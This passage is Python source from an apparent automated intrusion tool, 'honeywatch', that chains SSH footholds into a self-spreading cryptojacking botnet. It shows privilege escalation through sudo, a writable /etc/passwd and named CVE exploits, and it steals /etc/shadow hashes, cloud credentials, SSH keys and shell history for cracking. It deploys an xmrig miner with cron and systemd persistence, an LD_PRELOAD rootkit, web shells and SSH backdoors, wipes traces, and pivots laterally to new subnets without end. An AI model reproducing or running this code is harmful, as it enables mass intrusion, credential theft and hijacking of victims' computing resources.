        Without this step, a non-root foothold (e.g. ubuntu) silently
        produces nothing in escalate because grab_shadow can't read
        /etc/shadow.
        """
        if not self.state.footholds:
            self._emit(ChainPhase.PRIVESC, "skipping (no footholds)")
            return
        store = self._store()

        privesc_cmd = (
            "echo '---sudo---'; sudo -n -l 2>/dev/null || true; "
            "echo '---suid---'; find / -perm -4000 -type f 2>/dev/null | head -20; "
            "echo '---writable_cron---'; ls -la /etc/cron* /etc/crontab 2>/dev/null | grep -v '^d'; "
            "echo '---kernel---'; uname -r; "
            "echo '---sudoers---'; cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'; "
            "echo '---docker---'; groups 2>/dev/null | grep -i docker; "
            "echo '---docker_sock---'; ls -la /var/run/docker.sock 2>/dev/null || true; "
            "echo '---pkexec---'; command -v pkexec 2>/dev/null || true; "
            "echo '---sudo_ver---'; sudo --version 2>/dev/null | head -1 || true; "
            "echo '---writable_pass---'; ls -la /etc/passwd 2>/dev/null; "
            "echo '---id---'; id"
        )

        sem = self._sem

        async def _check(foo: tuple) -> dict | None:
            ip, port, user, pw = foo
            key_path = None
            if pw and pw.startswith("key:"):
                key_path = pw[4:]
                pw = None
            async with sem:
                rc, out, err = await asyncio.to_thread(
                    _ssh_exec, ip, port, user, pw, key_path,
                    privesc_cmd, 15.0,
                )
            if rc is None or rc != 0:
                return {"ip": ip, "port": port, "result": out, "error": err,
                        "root": False}
            # Check for privilege escalation signals.
            out_lower = (out or "").lower()
            has_sudo_nopasswd = "nopasswd" in out_lower or "(all) nopasswd" in out_lower
            # Writable /etc/passwd: check for group/other write bits in the
            # permission string (position 5 = group write, position 8 = other
            # write). A world-writable /etc/passwd owned by root is the most
            # common writable-passwd scenario — the old heuristic excluded
            # lines containing "root root" which missed exactly this case.
            has_writable_passwd = False
            for line in (out or "").splitlines():
                if "/etc/passwd" in line and line.strip().startswith("-rw"):
                    stripped = line.strip()
                    if len(stripped) > 8:
                        has_writable_passwd = stripped[5] == "w" or stripped[8] == "w"
                    break
            is_root = "uid=0(" in out_lower or "uid=0(" in (out or "").lower()
            # If the foothold user is already root, no privesc needed.
            if is_root:
                return {"ip": ip, "port": port, "result": out, "root": True}
            # If sudo -n -l shows NOPASSWD, we can run commands as root.
            if has_sudo_nopasswd:
                # Re-grab /etc/shadow as root via sudo.
                rc2, shadow_out, _ = await asyncio.to_thread(
                    _ssh_exec, ip, port, user, pw, key_path,
                    "sudo -n cat /etc/shadow 2>/dev/null", 10.0,
                )
                if rc2 == 0 and shadow_out and "$" in shadow_out:
                    safe_ip = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
                    stash = os.path.join(self.cfg.shadow_stash, safe_ip)
                    os.makedirs(stash, exist_ok=True)
                    with open(os.path.join(stash, "shadow"), "w") as f:
                        f.write(shadow_out)
                    self._emit(ChainPhase.PRIVESC,
                               f"{ip}:{port} privesc via sudo NOPASSWD -> shadow grabbed")
                    return {"ip": ip, "port": port, "result": out, "root": True}
            # Writable /etc/passwd: append a root user with a known password.
            # This is the second-most-common automated privesc vector — the
            # old code detected it but never exploited it.
            if has_writable_passwd:
                # Generate a SHA-512 hash for "honeywatch" password using
                # openssl on the target, then append a root entry to /etc/passwd.
                passwd_inject_cmd = (
                    'PW_HASH=$(openssl passwd -6 honeywatch 2>/dev/null '
                    '|| python3 -c "import crypt; print(crypt.crypt(\\"honeywatch\\",\\"\\\\$6\\\\$salthash\\"))" 2>/dev/null); '
                    'echo "honeywatch:${PW_HASH}:0:0::/root:/bin/bash" >> /etc/passwd'
                )
                rc2, hash_out, _ = await asyncio.to_thread(
                    _ssh_exec, ip, port, user, pw, key_path,
                    passwd_inject_cmd, 10.0,
                )
                if rc2 == 0:
                    # Verify the new user can SSH in as root.
                    rc3, id_out, _ = await asyncio.to_thread(
                        _ssh_exec, ip, port, "honeywatch", "honeywatch",
                        None, "id", 5.0,
                    )
                    if rc3 == 0 and "uid=0" in (id_out or "").lower():
                        self._emit(ChainPhase.PRIVESC,
                                   f"{ip}:{port} privesc via writable /etc/passwd -> root")
                        # Grab shadow as the new root user.
                        rc4, shadow_out, _ = await asyncio.to_thread(
                            _ssh_exec, ip, port, "honeywatch", "honeywatch",
                            None, "cat /etc/shadow 2>/dev/null", 10.0,
                        )
                        if rc4 == 0 and shadow_out and "$" in shadow_out:
                            safe_ip = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
                            stash = os.path.join(self.cfg.shadow_stash, safe_ip)
                            os.makedirs(stash, exist_ok=True)
                            with open(os.path.join(stash, "shadow"), "w") as f:
                                f.write(shadow_out)
                        return {"ip": ip, "port": port, "result": out, "root": True}

            # --- Phase 6: Exploit payload deployment (Finding #1) ---
            # The recon detected privesc signals (pkexec, sudo version, docker
            # socket, kernel version). Now deploy the matching exploit payload
            # from the registry — this closes the loop: recon detects -> exploit
            # deploys -> root obtained.

            # PwnKit: if pkexec exists, try CVE-2021-4034 (most reliable).
            if "pkexec" in out_lower and "/usr/bin/pkexec" in (out or ""):
                result = await self._try_exploit(
                    ip, port, user, pw, key_path, "privesc_pwnkit")
                if result:
                    return result

            # Baron Samedit: if sudo is installed, try CVE-2021-3156.
            if "sudo" in out_lower and ("sudo_ver" in out_lower or "Sudo" in (out or "")):
                result = await self._try_exploit(
                    ip, port, user, pw, key_path, "privesc_sudo")
                if result:
                    return result

            # Dirty Pipe: if kernel is 5.8+, try CVE-2022-0847.
            kernel_match = re.search(r"(\d+)\.(\d+)", (out or ""))
            if kernel_match:
                major = int(kernel_match.group(1))
                minor = int(kernel_match.group(2))
                if major == 5 and minor >= 8:
                    result = await self._try_exploit(
                        ip, port, user, pw, key_path, "privesc_dirtypipe")
                    if result:
                        return result

            # Docker socket escape: if /var/run/docker.sock exists.
            if "docker.sock" in out_lower:
                result = await self._try_exploit(
                    ip, port, user, pw, key_path, "privesc_docker_escape")
                if result:
                    return result

            # Cron PATH hijack: if writable cron files exist.
            if "writable_cron" in out_lower and ("-rw" in out_lower.split("writable_cron")[1][:100] if "writable_cron" in out_lower else False):
                result = await self._try_exploit(
                    ip, port, user, pw, key_path, "privesc_cron_path")
                if result:
                    return result

            return {"ip": ip, "port": port, "result": out, "root": False}

        results = await asyncio.gather(*(_check(f) for f in self.state.footholds))
        upgraded = 0
        for r in results:
            if r and r.get("root"):
                # Upgrade the foothold's user to root so escalate can grab shadow.
                for i, (ip, port, user, pw) in enumerate(self.state.footholds):
                    if ip == r["ip"] and port == r["port"] and not user == "root":
                        self.state.footholds[i] = (ip, port, "root", pw)
                        upgraded += 1
                        # Record the upgraded foothold in the store so resume
                        # reconstructs it without re-exploiting.
                        store.upsert_foothold(
                            ip, port, "root", pw,
                            source="chain-privesc",
                        )
        self._emit(ChainPhase.PRIVESC,
                   f"{upgraded} foothold(s) upgraded to root "
                   f"({len(self.state.footholds)} total)")

    async def phase_escalate(self) -> None:
        """Offline-hashcrack every grabbed shadow -> more creds.

        Each per-foothold hashcat/john run is a blocking subprocess; the
        serial loop stalled large foothold sets. Runs fan out concurrently,
        bounded by the shared chain semaphore.
        """
        if not self.state.footholds:
            self._emit(ChainPhase.ESCALATE, "skipping (no footholds)")
            return
        from honeywatch.crack import default_wordlist_path
        from honeywatch.hashcrack import crack_shadow

        wordlist = self.cfg.hashcrack_wordlist or default_wordlist_path()

        store = self._store()
        sem = self._sem

        async def _crack_one(f: tuple) -> list[dict]:
            ip, port, user, pw = f
            # Sanitize the IP for the stash path (path-traversal guard) —
            # grab_shadow/grab_loot do this, but phase_escalate was building
            # the path with a raw f-string. Lateral pivot hosts from
            # known_hosts/history can include hostnames, and a hostname
            # containing / or .. would traverse.
            safe_ip = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
            stash = os.path.join(self.cfg.shadow_stash, safe_ip, "shadow")
            if not os.path.isfile(stash):
                return []
            async with sem:
                res = await asyncio.to_thread(
                    crack_shadow, stash, wordlist, self.cfg.hashcrack_tool,
                )
            return [
                {"ip": ip, "port": port, "user": c["user"],
                 "password": c["password"]}
                for c in res.credentials()
            ]

        results = await asyncio.gather(*(_crack_one(f) for f in self.state.footholds))
        new_creds = 0
        seen = {(c["ip"], c["port"], c["user"], c["password"])
                for c in self.state.credentials}
        for creds in results:
            for cred in creds:
                store.upsert_credential(
                    cred["ip"], cred["port"], cred["user"], cred["password"],
                    attempts=1, source="chain-hashcrack")
                new_creds += 1
                key = (cred["ip"], cred["port"], cred["user"], cred["password"])
                if key not in seen:
                    self.state.credentials.append(cred)
                    seen.add(key)
        self._emit(ChainPhase.ESCALATE, f"offline-cracked {new_creds} new credential(s) "
                   f"({len(self.state.credentials)} total)")

    async def phase_loot(self) -> None:
        """Exfil credentials, cloud metadata, and intel from every new foothold.

        This is the blackhat growth engine honeywatch was missing. Real
        cryptojacking botnets harvest AWS/GCP/Azure role creds via IMDS,
        SSH private keys, kubeconfig, docker creds, and shell history —
        not just /etc/shadow. Cloud creds let you spawn *fresh* EC2/GCP
        instances mining on the operator's bill (planet-scale growth that
        doesn't depend on finding another vulnerable SSH box).

        The per-foothold SFTP+IMDS grab is slow; the serial loop previously
        stalled a 1000-foothold round for hours. Now loots fan out
        concurrently, bounded by the shared chain semaphore.
        """
        from honeywatch.loot import grab_loot

        if not self.state.footholds:
            self._emit(ChainPhase.LOOT, "skipping (no footholds)")
            return
        already_looted = set(self.state.looted_footholds)
        sem = self._sem

        async def _loot_one(f: tuple) -> None:
            ip, port, user, pw = f
            key = (ip, port)
            if key in already_looted:
                return
            async with sem:
                res = await asyncio.to_thread(
                    grab_loot, ip=ip, port=port, user=user, password=pw,
                    stash_dir=self.cfg.shadow_stash,  # share the stash root
                )
            already_looted.add(key)
            self.state.looted_footholds.append(key)
            self.state.loot.append({"ip": ip, "port": port,
                                   "summary": res.summary(),
                                   "files": len(res.files),
                                   "ssh_keys": len(res.ssh_keys),
                                   "cloud_creds": len(res.cloud_creds),
                                   "pivot_targets": len(res.pivot_targets)})
            # Track recovered SSH private keys for key-based pivoting in later
            # rounds (the spray phase can't reach publickey-only hosts).
            for kp in res.ssh_keys:
                if kp not in self.state.recovered_ssh_keys:
                    self.state.recovered_ssh_keys.append(kp)
            # Track cloud creds (highest-value loot).
            if res.cloud_creds:
                self.state.cloud_creds.append({
                    "ip": ip, "port": port,
                    "creds": list(res.cloud_creds.keys()),
                    "metadata": {k: v for k, v in res.metadata.items()
                                 if k in ("aws_roles", "aws_instance_id",
                                          "gcp_token", "azure_instance")},
                })
            if res.vulnerable_packages:
                for pkg in res.vulnerable_packages:
                    self.state.vulnerable_packages.append({
                        "ip": ip, "port": port, **pkg,
                    })
            if res.error:
                self._emit(ChainPhase.LOOT,
                           f"{ip}:{port} loot failed: {res.error}")
            else:
                self._emit(ChainPhase.LOOT,
                           f"{ip}:{port} looted: {res.summary()}")

        targets = [(ip, port, user, pw) for ip, port, user, pw in self.state.footholds
                   if (ip, port) not in already_looted]
        before = len(self.state.looted_footholds)
        await asyncio.gather(*(_loot_one(f) for f in targets))
        new_count = len(self.state.looted_footholds) - before
        self._emit(ChainPhase.LOOT,
                    f"looted {new_count} new foothold(s) "
                    f"({len(self.state.recovered_ssh_keys)} ssh key(s), "
                    f"{len(self.state.cloud_creds)} cloud cred hit(s), "
                    f"{len(self.state.vulnerable_packages)} cve-prone pkg(s) total)")

    async def phase_persist(self) -> None:
        """Deploy the cryptojacker payload onto every foothold.

        Real cryptojacking botnets don't just drop xmrig — they chain three
        things onto the deploy: (1) kill any competing miner already running,
        (2) deploy the miner, (3) install persistence (systemd + cron) so a
        reboot doesn't lose the box, and (4) drop an SSH authorized_keys
        backdoor so access survives a password change. Without this a reboot
        or a single `pkill xmrig` reverts the whole foothold.

        Phase 8: per-foothold persistence selection. The evasion chain is no
        longer hardcoded — it's selected based on what each foothold supports.
        A container foothold skips systemd (no init system). A host with a web
        server gets web_shell_persist (highest-survival vector). A root Linux
        host gets ld_preload_rootkit (hides artifacts). Windows hosts get
        scheduled_task_persist instead of systemd/cron.
        """
        if not self.state.footholds:
            self._emit(ChainPhase.PERSIST, "no footholds; skipping deploy")
            return
        from honeywatch.c2.store import C2Store
        from honeywatch.models import Target
        from honeywatch.ops import build_manifest, enqueue_operation

        if self.cfg.payload_id in {"xmrig", "xmrigcc"}:
            missing = [k for k in ("pool", "wallet") if not getattr(self.cfg, k)]
            if missing:
                flags = ", ".join(f"--{k}" for k in missing)
                self._emit(
                    ChainPhase.PERSIST,
                    f"ABORT: miner deploy needs {flags} "
                    f"(configure via `honeywatch setup` or pass {flags})",
                )
                return

        # Phase 8: group footholds by their persistence profile. Each group
        # gets a different evasion chain tailored to what the host supports.
        # The profile is derived from the loot phase's data (container
        # detection, web service detection, OS detection, root status).
        groups: dict[str, list[tuple[str, int, str, str]]] = {}
        for foo in self.state.footholds:
            ip, port, user, pw = foo
            profile = self._persistence_profile(ip, port, user)
            groups.setdefault(profile, []).append(foo)

        base_variables = {
            "pool": self.cfg.pool, "wallet": self.cfg.wallet,
            "worker": self.cfg.worker, "threads": str(self.cfg.threads),
            "tls": str(self.cfg.tls).lower(),
        }
        if self.cfg.backdoor_key:
            base_variables["backdoor_key"] = self.cfg.backdoor_key

        total_enqueued = 0
        for profile, footholds_in_group in groups.items():
            evasion = self._evasion_chain_for_profile(profile)
            targets: list[Target] = []
            for ip, port, user, pw in footholds_in_group:
                targets.append(Target(
                    ip=ip, port=port, label="real", confidence=1.0,
                    allowed_categories=["miner"], ssh_user=user, ssh_pass=pw,
                ))
            variables = dict(base_variables)
            try:
                manifest = build_manifest(self.cfg.payload_id, targets, variables,
                                          apply_evasion=evasion)
                c2 = C2Store(self.cfg.db_path)
                op = enqueue_operation(c2, manifest)
                seen_q = set(self.state.enqueued)
                for t in targets:
                    key = (t.ip, t.port)
                    if key not in seen_q:
                        self.state.enqueued.append(key)
                        seen_q.add(key)
                total_enqueued += len(targets)
                self._emit(ChainPhase.PERSIST,
                           f"enqueued {op.id}: {len(targets)} task(s) "
                           f"profile={profile} evasion=[{','.join(evasion)}]")
            except Exception as exc:
                self._emit(ChainPhase.PERSIST,
                           f"deploy failed for profile={profile}: "
                           f"{type(exc).__name__}: {exc}")

        if total_enqueued:
            self._emit(ChainPhase.PERSIST,
                       f"total: {total_enqueued} deploy task(s) across "
                       f"{len(groups)} profile(s)")

    def _persistence_profile(self, ip: str, port: int, user: str) -> str:
        """Determine the persistence profile for a foothold.

        Inspects the loot data for this foothold to determine:
        - Is it a container? (.dockerenv, cgroup patterns)
        - Does it have a web service? (ports 80/443/8080/8443 in loot)
        - Is it Windows? (uname or cmd.exe detected)
        - Is the user root? (user == "root" or privesc upgraded)

        Returns a profile string like "linux_root_web", "linux_container",
        "linux_normal", "windows".
        """
        # Check if the user is root (privesc may have upgraded it).
        is_root = user == "root"

        # Check loot for this foothold.
        loot_for_host = [
            l for l in self.state.loot
            if l.get("ip") == ip or l.get("target") == f"{ip}:{port}"
        ]

        # Container detection from loot metadata.
        is_container = False
        has_web = False
        is_windows = False
        for l in loot_for_host:
            metadata = l.get("metadata", {}) if isinstance(l, dict) else {}
            if metadata.get("docker_socket_present") or metadata.get("docker_running"):
                is_container = True
            # Check for container indicators in the loot data.
            loot_str = str(l).lower()
            if ".dockerenv" in loot_str or "containerd" in loot_str or "kubepods" in loot_str:
                is_container = True
            # Web service detection: ports 80/443/8080/8443 in the host's
            # service list or loot metadata.
            if any(str(p) in loot_str for p in (80, 443, 8080, 8443)):
                has_web = True
            # Windows detection.
            if "cmd.exe" in loot_str or "windows" in loot_str or "microsoft" in loot_str:
                is_windows = True

        # Also check cloud creds metadata for docker socket.
        for cc in self.state.cloud_creds:
            if isinstance(cc, dict) and cc.get("ip") == ip:
                if "docker_socket" in str(cc.get("creds", {})).lower():
                    is_container = True

        if is_windows:
            return "windows"
        parts = ["linux"]
        if is_container:
            parts.append("container")
        elif is_root:
            parts.append("root")
        else:
            parts.append("normal")
        if has_web:
            parts.append("web")
        return "_".join(parts)

    def _evasion_chain_for_profile(self, profile: str) -> list[str]:
        """Build the evasion chain for a persistence profile.

        Every chain starts with kill_miners and ends with cleanup. The
        persistence payloads in between are selected based on the profile.
        """
        chain = ["kill_miners"]
        # Add operator-configured evasion first.
        if self.cfg.evasion:
            chain.extend(self.cfg.evasion)

        if profile == "windows":
            # Windows: no systemd/cron. Use scheduled task + SSH backdoor.
            if "scheduled_task_persist" not in chain:
                chain.append("scheduled_task_persist")
            if self.cfg.backdoor_key and "sshkey_backdoor" not in chain:
                chain.append("sshkey_backdoor")
        elif "container" in profile:
            # Container: no systemd (usually). Cron + web shell if web service.
            if "cron_persist" not in chain:
                chain.append("cron_persist")
            if "web" in profile and "web_shell_persist" not in chain:
                chain.append("web_shell_persist")
            if self.cfg.backdoor_key and "sshkey_backdoor" not in chain:
                chain.append("sshkey_backdoor")
        elif "root" in profile:
            # Root Linux: systemd + cron + LD_PRELOAD rootkit + web shell if web.
            if "systemd_persist" not in chain:
                chain.append("systemd_persist")
            if "cron_persist" not in chain:
                chain.append("cron_persist")
            if "ld_preload_rootkit" not in chain:
                chain.append("ld_preload_rootkit")
            if "web" in profile and "web_shell_persist" not in chain:
                chain.append("web_shell_persist")
            if self.cfg.backdoor_key and "sshkey_backdoor" not in chain:
                chain.append("sshkey_backdoor")
        else:
            # Normal Linux (non-root): systemd + cron + SSH backdoor.
            if "systemd_persist" not in chain:
                chain.append("systemd_persist")
            if "cron_persist" not in chain:
                chain.append("cron_persist")
            if "web" in profile and "web_shell_persist" not in chain:
                chain.append("web_shell_persist")
            if self.cfg.backdoor_key and "sshkey_backdoor" not in chain:
                chain.append("sshkey_backdoor")

        # cleanup runs LAST — wipes traces after persistence is installed.
        if "cleanup" not in chain:
            chain.append("cleanup")
        return chain

    async def phase_pivot(self) -> None:
        """Discover adjacent subnets + lateral pivot targets from each foothold.

        Three sources of new recon targets, mirroring what every real
        cryptojacker pulls:
          1. ``ip -o -4 addr`` on the foothold -> adjacent /24 subnets to scan.
          2. ``ip neigh`` / ``arp -n`` on the foothold -> ARP neighbors
             (adjacent hosts on the same L2 segment). VM vendor tags from MAC
             OUI lookup identify honeypot VMs vs real hardware.
          3. Loot harvested in ``phase_loot`` -> known_hosts, ssh config jump
             hosts, and internal hosts from shell history. These are often a
             richer pivot source than the network graph: ~/.ssh/known_hosts
             lists every box the victim already SSH'd into.

        The per-foothold SSH probe runs concurrently (bounded by the shared
        chain semaphore) instead of serially.
        """
        if not self.state.footholds:
            self._emit(ChainPhase.PIVOT, "no footholds to pivot from")
            return
        sem = self._sem

        async def _probe(f: tuple) -> tuple[list[str], list[tuple[str, str, str]]]:
            ip, port, user, pw = f
            async with sem:
                rc_if, out_if, _ = await asyncio.to_thread(
                    _ssh_exec, ip, port, user, pw, None,
                    "ip -o -4 addr 2>/dev/null || ifconfig 2>/dev/null",
                )
                rc_arp, out_arp, _ = await asyncio.to_thread(
                    _ssh_exec, ip, port, user, pw, None,
                    "ip neigh 2>/dev/null || arp -n 2>/dev/null",
                )
            nets = _adjacent_subnets(out_if) if rc_if == 0 and out_if else []
            if nets:
                self._emit(ChainPhase.PIVOT, f"{ip} sits on {', '.join(nets)}")
            neighbors = _parse_arp_neighbors(out_arp) if rc_arp == 0 and out_arp else []
            if neighbors:
                vm_count = sum(1 for _, _, v in neighbors if v)
                self._emit(ChainPhase.PIVOT,
                           f"{ip} sees {len(neighbors)} ARP neighbor(s)"
                           f" ({vm_count} VM{'s' if vm_count != 1 else ''})")
            return nets, neighbors

        probe_results = await asyncio.gather(
            *(_probe(f) for f in self.state.footholds)
        )
        new_nets: list[str] = []
        all_neighbors: list[tuple[str, str, str]] = []
        for nets, neighbors in probe_results:
            new_nets.extend(nets)
            all_neighbors.extend(neighbors)
        # De-dup ARP neighbors by IP, accumulating into state.
        seen_arp: set[str] = {n[0] for n in self.state.arp_neighbors}
        unique_neighbors = [n for n in all_neighbors if n[0] not in seen_arp]
        self.state.arp_neighbors = list(self.state.arp_neighbors) + unique_neighbors
        lateral_hosts: list[str] = []
        # Pull lateral pivot targets from the loot stash (known_hosts,
        # ssh_config, history) that phase_loot already exfiltrated. These
        # survive across rounds because loot accumulates.
        loot_root = self.cfg.shadow_stash
        for loot_entry in self.state.loot:
            # Re-read the exfiltrated known_hosts/ssh_config/history from the
            # stash. The stash lives at <shadow_stash>/<ip>/loot/.
            ip = loot_entry["ip"]
            ip_dir = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
            loot_dir = os.path.join(loot_root, ip_dir, "loot")
            for fname in ("ssh_known_hosts", "ssh_config", "bash_history",
                          "zsh_history", "etc_hosts"):
                fpath = os.path.join(loot_dir, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="replace") as fh:
                        text = fh.read()
                except OSError:
                    continue
                from honeywatch.loot import (
                    parse_known_hosts, parse_ssh_config, parse_history_for_targets,
                )
                if fname == "ssh_known_hosts":
                    for h in parse_known_hosts(text):
                        lateral_hosts.append(h.host)
                elif fname == "ssh_config":
                    for b in parse_ssh_config(text):
                        h = b.get("hostname") or b.get("host", "")
                        if h and h != "*":
                            lateral_hosts.append(h)
                elif fname in ("bash_history", "zsh_history"):
                    hosts, _p = parse_history_for_targets(text)
                    lateral_hosts.extend(hosts)
                elif fname == "etc_hosts":
                    for line in text.splitlines():
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        parts = line.split()
                        if len(parts) >= 2:
                            for alias in parts[1:]:
                                if alias not in ("localhost",):
                                    lateral_hosts.append(alias)
        # ARP neighbors from footholds — adjacent hosts on the same L2 segment.
        # These are the highest-fidelity pivot targets: the foothold can
        # directly reach them (same broadcast domain).
        for ip, _mac, vendor in self.state.arp_neighbors:
            lateral_hosts.append(ip)

        # de-dup this round's nets, excluding anything already pivoted into in
        # a prior round so we never re-scan a subnet we've already touched.
        seen: set = set(self.state.pivoted_subnets)
        unique_nets = [n for n in new_nets if not (n in seen or seen.add(n))]
        # Accumulate every subnet the chain has pivoted into across all rounds.
        self.state.pivoted_subnets = list(self.state.pivoted_subnets) + unique_nets
        # De-dup lateral hosts (IPs or hostnames from known_hosts/history).
        # Convert hostnames to CIDRs where possible; otherwise treat as
        # explicit host targets. We resolve hostnames later in recon via the
        # scanner's target list (it accepts IPs/CIDRs/hostnames).
        unique_lateral: list[str] = []
        seen_l: set[str] = set(self.state.pivoted_subnets)
        for h in lateral_hosts:
            if h in seen_l:
                continue
            seen_l.add(h)
            # Try to convert a bare IP into its /24 so recon sweeps the
            # neighbour block; hostnames stay as-is (recon resolves them).
            try:
                import ipaddress
                net = ipaddress.ip_network(f"{h}/24", strict=False)
                unique_lateral.append(str(net))
            except ValueError:
                unique_lateral.append(h)
        # Convert discovered /24s + lateral hosts into the next recon target list.
        self.cfg.targets = unique_nets + unique_lateral
        self._emit(ChainPhase.PIVOT,
                   f"{len(unique_nets)} new subnet(s) + {len(unique_lateral)} "
                   f"lateral host(s) queued for recon "
                   f"({len(self.state.pivoted_subnets)} total pivoted)")

    # -- loaders -----------------------------------------------------------
    def _load_users(self) -> list[str]:
        from honeywatch.crack import default_users
        users = list(self.cfg.users)
        if self.cfg.user_file:
            try:
                with open(self.cfg.user_file, "r", encoding="utf-8") as fh:
                    users += [u.strip() for u in fh if u.strip() and not u.startswith("#")]
            except OSError:
                pass
        return users or default_users()

    def _load_passwords(self) -> list[str]:
        passwords = list(self.cfg.passwords)
        if self.cfg.password_file:
            try:
                with open(self.cfg.password_file, "r", encoding="utf-8") as fh:
                    passwords += [p.strip() for p in fh if p.strip() and not p.startswith("#")]
            except OSError:
                pass
        return passwords

    # -- loop --------------------------------------------------------------
    def run(self) -> ChainState:
        """Run the full chain, pivoting up to max_rounds.

        ``max_rounds=0`` runs forever (a true unattended daemon) until growth
        exhausts -- a pivot round that finds no new subnets. ``max_rounds=N``
        caps it at N rounds.

        Safe from any context: when no event loop is running (CLI path) the
        async engine is driven with ``asyncio.run``; when called inside a
        running loop (the agent's ``run_chain`` tool, a notebook, another
        async caller) the engine runs in a worker thread so the loop is never
        nested — this kills the old ``RuntimeError: asyncio.run() cannot be
        called from a running event loop`` collision.
        """
        try:
            asyncio.get_running_loop()
        except RuntimeError:
            # No running loop: safe to drive the engine directly.
            return asyncio.run(self._run_async())
        # Already inside a loop: run the engine in a worker thread.
        import concurrent.futures

        def _run_engine():
            return asyncio.run(self._run_async())

        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
            return pool.submit(_run_engine).result()

    async def _run_async(self) -> ChainState:
        """Async engine body. The VPN gate is enforced at entry so every
        network phase (spray, foothold, loot, pivot) is covered, not just the
        recon scanner subprocess. A chain invoked programmatically (e.g. via
        the agent's ``run_chain`` tool) with ``skip_vpn_check=False`` against
        an unconnected Mullvad raises ``VpnError`` before any phase runs.

        One :class:`asyncio.Semaphore` bounds every network fan-out in the
        chain (enumerate precheck, foothold verify, loot, pivot) so a
        planet-scale run cannot hand a million threads to the default
        executor at once — and the phases that used to run serially now run
        concurrently, bounded by ``cfg.host_concurrency``.
        """
        if not self.cfg.skip_vpn_check:
            self._require_vpn(False)
        # Durable resume: restore a killed run's state so we don't re-scan
        # pivoted subnets, re-SFTP loot, or re-enqueue deploys. The run id is
        # derived from the db path + a per-process nonce so two concurrent
        # chains on the same db don't clobber each other's state.
        run_id = self.cfg.run_id or f"run-{os.getpid()}-{int(time.time())}"
        self._run_id = run_id
        try:
            persisted = self._store().load_chain_state(run_id)
            if persisted:
                self.state.round = persisted["round"]
                self.state.pivoted_subnets = persisted["pivoted_subnets"]
                self.state.arp_neighbors = persisted.get("arp_neighbors", [])
                self.state.looted_footholds = persisted["looted_footholds"]
                self.state.enqueued = persisted["enqueued"]
                self.state.recovered_ssh_keys = persisted["recovered_ssh_keys"]
                self.state.cloud_creds = persisted["cloud_creds"]
                self.state.loot = persisted["loot"]
                # v0.3: full state resume — hosts, sprayable, credentials,
                # footholds, stopped, stop_reason, phases_completed.
                if persisted.get("hosts"):
                    self.state.hosts = persisted["hosts"]
                if persisted.get("sprayable"):
                    self.state.sprayable = persisted["sprayable"]
                if persisted.get("credentials"):
                    self.state.credentials = persisted["credentials"]
                if persisted.get("footholds"):
                    self.state.footholds = persisted["footholds"]
                if persisted.get("stopped"):
                    self.state.stopped = persisted["stopped"]
                    self.state.stop_reason = persisted.get("stop_reason", "")
                if persisted.get("phases_completed"):
                    self.state.phases_completed = persisted["phases_completed"]
                if persisted.get("vulnerable_packages"):
                    self.state.vulnerable_packages = persisted["vulnerable_packages"]
                # Reconcile stale state fields with the store (source of truth).
                # The store was being written to continuously during the run;
                # the serialized JSON cache may be stale. Credentials, hosts,
                # footholds, and sprayable are rebuilt from the store. Fields
                # NOT in the store (pivoted_subnets, recovered_ssh_keys,
                # cloud_creds, loot) are accepted from the cache — they're
                # re-discovered idempotently on the next round.
                self._reconcile_from_store()
                self._emit(ChainPhase.ROUND,
                           f"resumed run {run_id} at round {persisted['round']} "
                           f"({len(persisted['pivoted_subnets'])} subnets, "
                           f"{len(persisted['looted_footholds'])} looted, "
                           f"{len(persisted['enqueued'])} enqueued, "
                           f"{len(self.state.footholds)} footholds, "
                           f"phases: {','.join(self.state.phases_completed) or 'none'})")
        except Exception as exc:
            self._emit(ChainPhase.ROUND, f"resume state unavailable: {type(exc).__name__}: {exc}")

        # Load UCB1 bandit state from the store (persists across runs).
        try:
            from honeywatch.agent.learning import UCB1Bandit
            arms = self._store().load_learning_outcomes()
            self.bandit = UCB1Bandit(arms=arms)
            self._emit(ChainPhase.ROUND,
                       f"bandit loaded: {len(arms)} banner arm(s)")
        except Exception as exc:
            self.bandit = None
            self._emit(ChainPhase.ROUND,
                       f"bandit unavailable: {type(exc).__name__}: {exc}")

        # Phase runner: on resume, skip phases that completed before the crash
        # within the SAME round. Phases must re-run each new round because pivot
        # discovers new hosts. A phase that crashed halfway is NOT in
        # phases_completed and will re-run (idempotent against the store).
        # phases_completed is cleared at the start of each round so the next
        # round's phases all execute.
        resume_completed = set(self.state.phases_completed)

        # Edge case: if all phases from the current round completed before the
        # crash (i.e., the crash happened at a round boundary, after pivot but
        # before the next round's recon), advance the round counter and clear
        # phases_completed so the chain starts the next round fresh.
        ALL_PHASES = [
            ChainPhase.RECON, ChainPhase.ENUMERATE, ChainPhase.SPRAY,
            ChainPhase.FOOTHOLD, ChainPhase.PRIVESC, ChainPhase.ESCALATE,
            ChainPhase.LOOT, ChainPhase.PERSIST, ChainPhase.PIVOT,
        ]
        if resume_completed and len(resume_completed) >= len(ALL_PHASES):
            self.state.round += 1
            resume_completed.clear()
            self._emit(ChainPhase.ROUND,
                       f"all phases completed before crash, advancing to round {self.state.round}")

        def _save_state() -> None:
            """Checkpoint current state to SQLite after each phase."""
            try:
                self._store().save_chain_state(run_id, {
                    "round": self.state.round,
                    "pivoted_subnets": self.state.pivoted_subnets,
                    "arp_neighbors": self.state.arp_neighbors,
                    "looted_footholds": self.state.looted_footholds,
                    "enqueued": self.state.enqueued,
                    "recovered_ssh_keys": self.state.recovered_ssh_keys,
                    "cloud_creds": self.state.cloud_creds,
                    "loot": self.state.loot,
                    "hosts": self.state.hosts,
                    "sprayable": self.state.sprayable,
                    "credentials": self.state.credentials,
                    "footholds": self.state.footholds,
                    "stopped": self.state.stopped,
                    "stop_reason": self.state.stop_reason,
                    "phases_completed": self.state.phases_completed,
                    "vulnerable_packages": self.state.vulnerable_packages,
                })
            except Exception as exc:
                self._emit(ChainPhase.ROUND,
                           f"checkpoint failed: {type(exc).__name__}: {exc}")

        async def _run_phase(phase: ChainPhase, coro) -> None:
            """Run one phase, checkpointing state on success."""
            phase_name = phase.value
            if phase_name in resume_completed:
                self._emit(phase, f"skipping (already completed before crash)")
                resume_completed.discard(phase_name)
